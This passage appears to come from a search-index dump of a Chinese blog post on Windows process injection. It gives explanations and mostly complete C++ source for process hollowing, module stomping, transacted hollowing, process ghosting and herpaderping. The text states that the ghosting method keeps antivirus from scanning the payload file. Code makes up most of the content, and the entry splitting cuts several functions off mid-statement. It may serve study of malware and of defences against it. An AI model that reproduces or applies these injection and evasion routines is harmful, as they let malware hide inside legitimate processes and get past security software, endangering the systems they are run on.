cout \u003c\u003c \"--\u003eCreate Process Failed.\" \u003c\u003c endl; return hProcess; } _PPEB pPEB = ReadRemotePEB(hProcess); //PLOADED_IMAGE pImage = ReadRemoteImage(hProcess,pPEB-\u003elpImageBaseAddress); cout \u003c\u003c \"--\u003eOpening source image.\" \u003c\u003c endl; HANDLE hFile = CreateFileA(lpSourceFile, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout \u003c\u003c \"--\u003eOpen EXE File Filed.\" \u003c\u003c endl; return hProcess; } DWORD dwSize = GetFileSize(hFile, 0); PBYTE pBuffer = new BYTE[dwSize]; DWORD dwBytesRead = 0; ReadFile(hFile, pBuffer, dwSize, \u0026dwBytesRead, NULL); PLOADED_IMAGE pSourceImage = GetLoadedImage((ULONG_PTR)pBuffer); PIMAGE_NT_HEADERS pSourceHeader = pSourceImage-\u003eFileHeader; cout \u003c\u003c \"--\u003eUnmapping Destination Section.\" \u003c\u003c endl; HMODULE hNTDLL = GetModuleHandleA(\"ntdll\"); _NtUnmapViewOfSection NtUnmapViewSection = (_NtUnmapViewOfSection)GetProcAddress(hNTDLL, \"NtUnmapViewOfSection\"); DWORD dwResult = NtUnmapViewSection(lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress); if (dwResult) { cout \u003c\u003c \"--\u003eError Unmapping Section.\" \u003c\u003c endl; return hProcess; } //计算镜像大小 DWORD lastSectionEnd = 0;//最后节+数据长度的地址 DWORD endOfSection = 0; SYSTEM_INFO sysInfo; DWORD alignedImageSize = 0; PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pSourceHeader); //节的对齐粒度 DWORD optionoalSectionSize = pSourceHeader-\u003eOptionalHeader.SectionAlignment; for (int i = 0; i \u003c (pSourceHeader-\u003eFileHeader.NumberOfSections); i++, section++) { //如果节中没有数据，则保留一节 if (section-\u003eSizeOfRawData == 0) endOfSection = section-\u003eVirtualAddress + optionoalSectionSize; else endOfSection = section-\u003eVirtualAddress + (section-\u003eSizeOfRawData); if (endOfSection \u003e lastSectionEnd) lastSectionEnd = endOfSection; } //通过系统信息获取页面大小 GetNativeSystemInfo(\u0026sysInfo); //最后一节与页面对齐 alignedImageSize = AlignValueUp(lastSectionEnd, sysInfo.dwPageSize); if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize)) return hProcess; cout \u003c\u003c \"--\u003eAllocating Memory.\" \u003c\u003c endl; LPVOID pRemoteImage = VirtualAllocEx ( lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress, alignedImageSize, MEM_RESERVE,//参考Memory Module方式 PAGE_READWRITE ); if (!pRemoteImage) { cout \u003c\u003c \"--\u003eAllocate Memory Failed.\" \u003c\u003c endl; cout \u003c\u003c \"--\u003eError Code:\" \u003c\u003c GetLastError() \u003c\u003c endl; return hProcess; } //装载地址与默认地址的差值 ULONG_PTR upDelta = (ULONG_PTR)pPEB-\u003elpImageBaseAddress - pSourceHeader-\u003eOptionalHeader.ImageBase; cout \u003c\u003c hex \u003c\u003c \"Source Image BaseAddress:\" \u003c\u003c pSourceHeader-\u003eOptionalHeader.ImageBase \u003c\u003c endl; cout \u003c\u003c hex \u003c\u003c \"Destination Image BaseAddress:\" \u003c\u003c pPEB-\u003elpImageBaseAddress \u003c\u003c endl; cout \u003c\u003c hex \u003c\u003c \"Relocation Delat:\" \u003c\u003c upDelta \u003c\u003c endl; pSourceHeader-\u003eOptionalHeader.ImageBase = (ULONG_PTR)pPEB-\u003elpImageBaseAddress; cout \u003c\u003c \"--\u003eWriting Headers\" \u003c\u003c endl; //提交内存 VirtualAllocEx ( lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress, pSourceHeader-\u003eOptionalHeader.SizeOfHeaders, MEM_COMMIT,//参考Memory Module方式 PAGE_READWRITE ); if (!WriteProcessMemory ( lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress, pBuffer, pSourceHeader-\u003eOptionalHeader.SizeOfHeaders, NULL )) { cout \u003c\u003c \"Writing Header Failed.\" \u003c\u003c endl; return hProcess; } cout \u003c\u003c \"--\u003eWriting Sections.\" \u003c\u003c endl; if (!CopySections(hProcess, (ULONG_PTR)pPEB-\u003elpImageBaseAddress, (ULONG_PTR)pBuffer)) { cout \u003c\u003c \"Copy Secitons Failed.\" \u003c\u003c endl; return hProcess; } cout \u003c\u003c \"--\u003eStart Delta.\" \u003c\u003c endl; //开始重定位 if(upDelta) for (DWORD x = 0; x \u003c pSourceImage-\u003eNumberOfSections; x++) { LPST","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:9:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"参考链接 https://bbs.pediy.com/thread-224706-1.htm https://bbs.pediy.com/thread-246023.htm https://github.com/m0n0ph1/Process-Hollowing Process-Hollowing.zip 常见进程注入的实现及内存dump分析.mhtml ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:9:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Module Stomping 该方法通过在目标进程中加载一个合法DLL,然后将shellcode或恶意DLL覆写到这个合法DLL的地址空间里. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:10:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 利用OpenProcess,VirtualAllocEx在目标进程中申请一片内存. 利用WriteProcessMemory将合法Dll的路径写入目标进程中. 利用CreateRemoteThread传入LoadLibraryA以及上述合法Dll的路径,在目标进程中加载上述合法Dll. 利用EnumProcessModules在目标进程中找到上述合法Dll的基地址,进而找到EP. 利用WriteProcessMemory在目标进程合法Dll的EP处写入ShellCode. 利用CreateRemoteThread传入上述合法Dll的EP,进而执行我们的ShellCode. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:10:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 #include \u003cWindows.h\u003e#include \u003cstdio.h\u003e#include \u003cPsapi.h\u003e#include \u003cstring\u003e // Find our loaded module base HMODULE FindModuleBase(HANDLE hProcess) { HMODULE hModuleList[1024]; wchar_t moduleName[MAX_PATH]; DWORD cb = sizeof(hModuleList); DWORD cbNeeded; // Enumerates all the modules in the process // and retrieve handle of all modules if (EnumProcessModules(hProcess, hModuleList, cbNeeded, \u0026cbNeeded)) { for (unsigned int i = 0; i \u003c (cbNeeded / sizeof(HMODULE)); i++) { // Getting full path of the module // Alternatively we can use API GetModuleBaseNameA if (GetModuleFileNameEx(hProcess, hModuleList[i], moduleName, (sizeof(moduleName) / sizeof(DWORD)))) { // Comapring if the module path has our dll if (wcsstr(moduleName, L\"filemgmt.dll\") != nullptr) { return hModuleList[i]; break; } } } } return 0; } LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) { //BYTE* targetDLLHeader[0x1000]; LPVOID targetDLLHeader = { 0 }; DWORD sizeOfHeader = 0x1000; // Allocate local heap targetDLLHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader); // Reading the header of target dll ReadProcessMemory(hProcess, (LPVOID)hModule, targetDLLHeader, sizeOfHeader, NULL); PIMAGE_DOS_HEADER dosHeder = (PIMAGE_DOS_HEADER)targetDLLHeader; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetDLLHeader + dosHeder-\u003ee_lfanew); // Getting entry point of the target dll DWORD_PTR dllEntryPoint = ntHeaders-\u003eOptionalHeader.AddressOfEntryPoint; wprintf(L\"[+] DllEntryPoint offset: %p\\n\", (LPVOID)dllEntryPoint); // DLL EntryPoint in memory LPVOID dllEntryPointMem = (LPVOID)(dllEntryPoint + (DWORD_PTR)hModule); wprintf(L\"[+] DllEntryPoint in memory: %p\\n\", dllEntryPointMem); return dllEntryPointMem; } BOOL ModuleStomp(unsigned char buf[], SIZE_T payloadSize, DWORD pid) { HANDLE hProcess = INVALID_HANDLE_VALUE; HANDLE hTargetModule = NULL; // module to load #ifdef _WIN64 LPCSTR targetLibrary = \"C:\\\\temp\\\\modules\\\\64\\\\filemgmt.dll\"; #else //LPCSTR targetLibrary = \"C:\\\\temp\\\\modules\\\\86\\\\filemgmt.dll\"; LPCSTR targetLibrary = \"C:/Windows/SysWOW64/filemgmt.dll\"; #endif LPVOID memBase; HMODULE moduleBase; LPVOID entryPoint = { 0 }; wprintf(L\"[+] Opening the target process, pid: %d\\n\", pid); // Open the target process with PID hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (hProcess == INVALID_HANDLE_VALUE) { perror(\"[-] Couldn't find the target process\\n\"); exit(-1); } size_t targetSize = lstrlenA(targetLibrary); // Allocate memory in the target process memBase = VirtualAllocEx(hProcess, NULL, targetSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (memBase == 0) { printf(\"%d\\n\", GetLastError()); perror(\"[-] Failed to allocate memory in target process\\n\"); exit(-1); } wprintf(L\"[+] Memory allocated at remote process address: %p\\n\", memBase); // Writing target library path to the newly allocated memory in target process if (!WriteProcessMemory(hProcess, memBase, targetLibrary, targetSize, NULL)) { perror(\"[-] Failed to write module in target process memory\\n\"); exit(-1); } wprintf(L\"[+] DLL path written to the allocated memory\\n\"); // Getting Address to the LoadLibraryA and converting it to the Thread routine LPTHREAD_START_ROUTINE LoadModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"LoadLibraryA\"); if (LoadModule == NULL) { perror(\"[-] Couldn't find the module LoadLibraryA\\n\"); exit(-1); } // Creating remote thread // This will load our target module in the target process hTargetModule = CreateRemoteThread(hProcess, NULL, 0, LoadModule, memBase, 0, NULL); if (hTargetModule == INVALID_HANDLE_VALUE) { perror(\"[-] Failed to load module in target process memory\\n\"); exit(-1); } wprintf(L\"[+] Successfully loaded module in the memory...\\n\"); WaitForSingleObject(hTargetModule, 2000); // Finding loaded module base moduleBase = FindModuleBase(hProcess); if (moduleBase == 0) { perror(\"[-] Module is not loaded in the memory\\n\"); exit(-1); } // Finding entrypoint of loaded module entryPoint = FindEntryPo","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:10:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Transacted Hollowing ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:11:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 利用NtCreateTransaction创建事务. 利用CreateFileTransacted以事务特性打开一个文件. 利用WriteFile向上述打开的文件写入恶意代码payload. 利用NtCreateSection根据上述文件内容创建一个section. 利用NtRollbackTransaction回滚之前的写操作. 利用CreateProcess创建一个挂起的目标进程. 利用NtMapViewOfSection将恶意代码的section映射到目标进程中,可以得到一个映射的地址sectionBaseAddress. 利用WriteProcessMemory以及ResumeThread执行恶意代码. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:11:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"代码 #include \u003cWindows.h\u003e#include \u003cstdio.h\u003e#include \"CWLInc.h\"#include \u003ciostream\u003e BYTE* GetPayloadBuffer(OUT size_t\u0026 p_size) { HANDLE hFile = CreateFileW(L\"C:/Users/XiaLuoHun/Desktop/LuoDst/x64/Release/LuoDst.exe\", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); if (hFile == INVALID_HANDLE_VALUE) { perror(\"[-] Unable to open payload file... \\n\"); exit(-1); } p_size = GetFileSize(hFile, 0); BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (bufferAddress == NULL) { perror(\"[-] Failed to allocated memory for payload buffer... \\n\"); exit(-1); } DWORD bytesRead = 0; if (!ReadFile(hFile, bufferAddress, p_size, \u0026bytesRead, NULL)) { perror(\"[-] Failed to read payload buffer... \\n\"); exit(-1); } return bufferAddress; } HANDLE MakeSectionWithTransaction(BYTE* payload, DWORD payloadSize) { HANDLE hTransaction; HANDLE hTransactedFile = INVALID_HANDLE_VALUE; HANDLE hSection; NTSTATUS status; DWORD bytesWritten; // Function Declaration HMODULE hNtdllModule = GetModuleHandleA(\"ntdll.dll\"); if (hNtdllModule == INVALID_HANDLE_VALUE) { perror(\"[-] Cannot found module ntdll.dll \\n\"); exit(-1); } _NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(hNtdllModule, \"NtCreateTransaction\"); if (pNtCreateTransaction == NULL) { perror(\"[-] Cannot found API NtCreateTransaction \\n\"); exit(-1); } _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(hNtdllModule, \"NtCreateSection\"); if (pNtCreateSection == NULL) { perror(\"[-] Cannot found API NtCreateSection \\n\"); exit(-1); } _NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(hNtdllModule, \"NtRollbackTransaction\"); if (pNtRollbackTransaction == NULL) { perror(\"[-] Cannot found API NtRollbackTransaction \\n\"); exit(-1); } // Create NTFS Transaction object _OBJECT_ATTRIBUTES objAttr; InitializeObjectAttributes(\u0026objAttr, NULL, 0, NULL, NULL); status = pNtCreateTransaction(\u0026hTransaction, TRANSACTION_ALL_ACCESS, \u0026objAttr, NULL, NULL, 0, 0, 0, NULL, NULL); if (!NT_SUCCESS(status)) { perror(\"[-] Error Creating Transaction Object!!\\n\"); exit(-1); } wprintf(L\"[+] NTFS Transaction Object Created\\n\"); // open target file for transaction wchar_t targetPath[MAX_PATH]; lstrcpyW(targetPath, L\"C:\\\\temp\\\\mynotes.txt\"); hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL, hTransaction, NULL, NULL); if (hTransactedFile == INVALID_HANDLE_VALUE) { perror(\"[-] Error Opening Target File For Transaction..\\n\"); exit(-1); } // Write payload to transacted file if (!WriteFile(hTransactedFile, payload, payloadSize, \u0026bytesWritten, NULL)) { perror(\"[-] Error writing payload into transaction!!\\n\"); exit(-1); } wprintf(L\"[+] Payload Written To The Transacted File \\n\"); // Create Section from transacted file status = pNtCreateSection(\u0026hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile); if (!NT_SUCCESS(status)) { perror(\"[-] Failed To Create Section From Transacted File..\\n\"); exit(-1); } wprintf(L\"[+] Section Created From Transaction \\n\"); CloseHandle(hTransactedFile); hTransactedFile = INVALID_HANDLE_VALUE; // Rollback the transaction status = pNtRollbackTransaction(hTransaction, TRUE); if (!NT_SUCCESS(status)) { perror(\"[-] Failed To Rollback Transaction\"); exit(-1); } wprintf(L\"[+] Transaction Rolled back..\\n\"); CloseHandle(hTransaction); hTransaction = INVALID_HANDLE_VALUE; return hSection; } HANDLE CreateSuspendedProcess(PROCESS_INFORMATION \u0026pi) { LPSTARTUPINFO sInfo = new STARTUPINFO(); sInfo-\u003ecb = sizeof(STARTUPINFOW); HANDLE hTargetProcess = INVALID_HANDLE_VALUE; wchar_t exePath[MAX_PATH]; lstrcpyW(exePath, L\"C:\\\\Windows\\\\System32\\\\calc.exe\"); // Create Process In Suspended Mode if (!CreateProcessW(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, sInfo, \u0026pi)) { perror(\"[-] Failed To Create Suspended Process.. \\n\"); exit(-1); } wprintf(L\"[+] Created Process In Suspended Mo","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:11:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Process Ghosting ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:12:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 该方法与Process Doppelganging从实现上几乎一样,唯一的区别就是处理不落地文件的方式: Process Doppelganging: 通过事务API打开文件,修改文件(写入payload),创建section,再回滚修改的内容. Process Ghosting: 打开文件,设置删除标志,修改文件(写入payload),创建section,删除文件.这样进程运行时,反病毒软件打不开文件,因此无法做检测. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:12:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"代码 #include \u003cstdio.h\u003e#include \u003cWindows.h\u003e#include \"CWLInc.h\"#include \u003ciostream\u003e BYTE* GetPayloadBuffer(OUT size_t\u0026 p_size) { HANDLE hFile = CreateFileW(L\"C:/Users/XiaLuoHun/Desktop/LuoDst/x64/Release/LuoDst.exe\", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); if (hFile == INVALID_HANDLE_VALUE) { perror(\"[-] Unable to open payload file... \\n\"); exit(-1); } p_size = GetFileSize(hFile, 0); BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (bufferAddress == NULL) { perror(\"[-] Failed to allocated memory for payload buffer... \\n\"); exit(-1); } DWORD bytesRead = 0; if (!ReadFile(hFile, bufferAddress, p_size, \u0026bytesRead, NULL)) { perror(\"[-] Failed to read payload buffer... \\n\"); exit(-1); } CloseHandle(hFile); return bufferAddress; } HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntFilePath, BYTE* payload, size_t payloadSize) { HANDLE hFile; HANDLE hSection; NTSTATUS status; _OBJECT_ATTRIBUTES objAttr; UNICODE_STRING uFileName; IO_STATUS_BLOCK statusBlock = {0}; DWORD bytesWritten; // NT Functions Declaration _NtOpenFile pNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtOpenFile\"); if (pNtOpenFile == NULL) { perror(\"[-] Unable To Found API NtOpenFile...\\n\"); exit(-1); } _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlInitUnicodeString\"); if (pRtlInitUnicodeString == NULL) { perror(\"[-] Unable To Found API RtlInitUnicodeString...\\n\"); exit(-1); } _NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtSetInformationFile\"); if (pNtSetInformationFile == NULL) { perror(\"[-] Unable To Found API NtSetInfromationFile...\\n\"); exit(-1); } _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateSection\"); if (pNtCreateSection == NULL) { perror(\"[-] Unable To Found API NtCreateSection.. \\n\"); exit(-1); } pRtlInitUnicodeString(\u0026uFileName, ntFilePath); InitializeObjectAttributes(\u0026objAttr, \u0026uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL); wprintf(L\"[+] Opening The File...\\n\"); // Open File // FLAGS: // FILE_SUPERSEDED: deletes the old file and creates new one if file exists // FILE_SYNCHRONOUS_IO_NONALERT: All operations on the file are performed synchronously status = pNtOpenFile(\u0026hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, \u0026objAttr, \u0026statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT); if (!NT_SUCCESS(status)) { perror(\"[-] Error Opening File...\\n\"); exit(-1); } wprintf(L\"[+] Putting File Into Delete-Pending State...\\n\"); // Set disposition flag FILE_DISPOSITION_INFORMATION info = { 0 }; info.DeleteFile = TRUE; // Set delete-pending state to the file // FileDispositionInformation: Request to delete the file when it is closed status = pNtSetInformationFile(hFile, \u0026statusBlock, \u0026info, sizeof(info), FileDispositionInformation); if (!NT_SUCCESS(status)) { perror(\"[-] Error setting file to delete pending state...\\n\"); exit(-1); } wprintf(L\"[+] Writing Payload Into Delete-Pending State File...\\n\"); // Write Payload To File // Since we've set our file to delete-pending state // as soon as we close the handle the file will disappear if (!WriteFile(hFile, payload, payloadSize, \u0026bytesWritten, NULL)) { perror(\"[-] Failed to write payload to the file...\\n\"); exit(-1); } wprintf(L\"[+] Creating Section From Delete-Pending State File...\\n\"); // Before closing the handle we create a section from delete-pending file // This will later become the file-less section // once we close the handle to the delete-pending file status = pNtCreateSection(\u0026hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile); if (!NT_SUCCESS(status)) { perror(\"[-] Error setting file to delete pending state...\\n\"); exit(-1); } wprintf(L\"[+] Section Created From The Delete-Pending File...\\n\"); // Close the delete-pending file handle // This wi","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:12:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Herpaderping ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:13:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 利用CreateFile创建一个临时文件. 利用WriteFile将恶意代码payload写到上述的临时文件中. 利用NtCreateSection根据上述文件创建一个section. 利用NtCreateProcessEx根据上述section创建一个进程. 利用WriteFile修改磁盘上的临时文件内容. 利用RtlCreateProcessParametersEx创建一个进程环境变量块. 利用NtAllocateVirtualMemory,NtWriteVirtualMemory将上述进程环境变量块写入上方创建的进程中. 利用WriteProcessMemory修改上述进程的进程环境变量块. 利用NtCreateThreadEx在上述进程的入口点创建一个线程,运行恶意代码. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:13:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"代码 #include \u003cWindows.h\u003e#include \u003cstdio.h\u003e#include \"CWLInc.h\" BYTE* GetPayloadBuffer(OUT size_t\u0026 p_size) { HANDLE hFile = CreateFileW(L\"C:/Users/XiaLuoHun/Desktop/Advanced-Process-Injection-Workshop-master/payloads/payload64.exe\", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { perror(\"[-] Unable to open payload file... \\n\"); } p_size = GetFileSize(hFile, NULL); BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (bufferAddress == NULL) { perror(\"[-] Failed to allocate memory for payload buffer.. \\n\"); exit(-1); } DWORD bytesRead = 0; if (!ReadFile(hFile, bufferAddress, p_size, \u0026bytesRead, NULL)) { perror(\"[-] Failed to read payload buffer... \\n\"); exit(-1); } CloseHandle(hFile); return bufferAddress; } ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload,PROCESS_BASIC_INFORMATION pbi) { // Functions Declaration _RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlImageNtHeader\"); if (pRtlImageNtHeader == NULL) { perror(\"[-] Couldn't found API RtlImageNTHeader...\\n\"); exit(-1); } _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtReadVirtualMemory\"); if (pNtReadVirtualMemory == NULL) { perror(\"[-] Couldn't found API NtReadVirtualMemory...\\n\"); exit(-1); } // Retrieving entrypoint of our payload BYTE image[0x1000]; ULONG_PTR entryPoint; SIZE_T bytesRead; NTSTATUS status; ZeroMemory(image, sizeof(image)); status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, \u0026image, sizeof(image), \u0026bytesRead); if (!NT_SUCCESS(status)) { perror(\"[-] Error reading process base address..\\n\"); exit(-1); } wprintf(L\"[+] Base Address of target process PEB: %p \\n\", (ULONG_PTR)((PPEB)image)-\u003eImageBaseAddress); entryPoint = (pRtlImageNtHeader(payload)-\u003eOptionalHeader.AddressOfEntryPoint); entryPoint += (ULONG_PTR)((PPEB)image)-\u003eImageBaseAddress; wprintf(L\"[+] EntryPoint of the payload buffer: %p \\n\", entryPoint); return entryPoint; } BOOL Herpaderping(BYTE* payload,size_t payloadSize) { // Functions Declartion _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateSection\"); if (pNtCreateSection == NULL) { perror(\"[-] Couldn't find API NtCreateSection...\\n\"); exit(-1); } _NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateProcessEx\"); if (pNtCreateProcessEx == NULL) { perror(\"[-] Couldn't find API NtCreateProcessEx...\\n\"); exit(-1); } _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtQueryInformationProcess\"); if (pNtQueryInformationProcess == NULL) { perror(\"[-] Couldn't find API NtQueryInformationProcess...\\n\"); exit(-1); } _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\"); if (pNtCreateThreadEx == NULL) { perror(\"[-] Couldn't find API NtCreateThreadEx\\n\"); exit(-1); } _RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlCreateProcessParametersEx\"); if (pRtlCreateProcessParametersEx == NULL) { perror(\"[-] Couldn't find API RtlCreateProcessParametersEx\\n\"); exit(-1); } _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlInitUnicodeString\"); if (pRtlInitUnicodeString == NULL) { perror(\"[-] Couldn't find API RtlInitUnicodeString \\n\"); exit(-1); } _NtWriteVirtualMemory pNtWriteVirtualMemory = 